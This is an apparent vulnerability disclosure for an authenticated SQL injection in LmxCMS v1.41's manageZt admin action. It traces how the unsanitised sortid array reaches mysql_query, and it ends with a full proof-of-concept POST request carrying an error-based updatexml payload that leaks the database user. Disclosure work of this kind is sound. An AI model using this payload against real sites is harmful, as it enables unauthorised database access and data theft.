# SQL Injection in LmxCMS (Authenticated)
**Version: LmxCMS v1.41**

**Google Dork: N/A**

**Date: 04/29/2025**

**Tested on: Windows 11, Apache 2.4, MySQL 5.7, PHP 5.5**

**Software Link: http://www.lmxcms.com/**

**Description:** A critical SQL injection vulnerability exists in LmxCMS v1.41, located in the manageZt() method within c\admin\ZtAction.class.php. The vulnerability arises because user-supplied sortid parameters are directly concatenated into SQL queries without proper sanitization or parameter binding. This flaw allows attackers to inject arbitrary SQL code, which can lead to sensitive data exposure, privilege escalation, or complete compromise of the database. Exploitation can be achieved by sending a specially crafted POST request, allowing attackers to retrieve sensitive information, manipulate the database, or execute arbitrary SQL commands.

# code analysis
**Entry Point:** The vulnerability starts in the manageZt method of ZtAction.class.php. This method passes the user-supplied parameters to the sort method in ZtModel.class.php, which serves as the entry point for the injection.

<img width="500" alt="1745927531096" src="https://github.com/user-attachments/assets/776d5002-4d25-4623-b4d7-3857ba256019" />

**User Input Handling:** In the sort method, the sortid parameter is directly taken from the user input and passed to the updateModel method in Model.class.php, without any validation or sanitization, allowing the user to craft a malicious SQL injection payload.

<img width="500" alt="1745927592479" src="https://github.com/user-attachments/assets/90d6dcbe-fb1e-4462-a552-f6ebe374de9f" />

**SQL Construction:** In the updateModel method, the sortid parameter is passed to the updateDB method in db.class.php. Within updateDB, the parameter is used to construct an SQL query through the $param['where'] variable, which is concatenated into the SQL query string without proper sanitization.

<img width="500" alt="1745927637701" src="https://github.com/user-attachments/assets/0db7fe93-3c55-4c89-9a08-255727828d04" />

**SQL Execution:** Finally, the constructed SQL query containing the unsanitized sortid parameter is executed by the mysql_query() function in the updateDB method. This allows attackers to inject arbitrary SQL commands, leading to a SQL injection attack.

<img width="500" alt="1745927664633" src="https://github.com/user-attachments/assets/b67fbc76-91cf-4f66-859c-452758f4c777" />


**Payload used:**
```
POST /admin.php?m=zt&a=manageZt HTTP/1.1
Host: www.lmx.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://www.lmx.com/admin.php?m=login&a=login
Cookie: PHPSESSID=ldja45va9dd97u46jqvn7dni36
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

sortSub=1&sortid[]=1 and updatexml(1,concat(0x7e,(select user()),0x7e),1)
```

Example：
![image](https://github.com/user-attachments/assets/5a44c382-3977-48e8-9dbe-97f0d2d1069f)

![image](https://github.com/user-attachments/assets/e00a0481-8e34-4891-8f92-1076f4eae9ac)

![image](https://github.com/user-attachments/assets/deaa7641-ee3f-4838-b8a4-451cee5c6407)





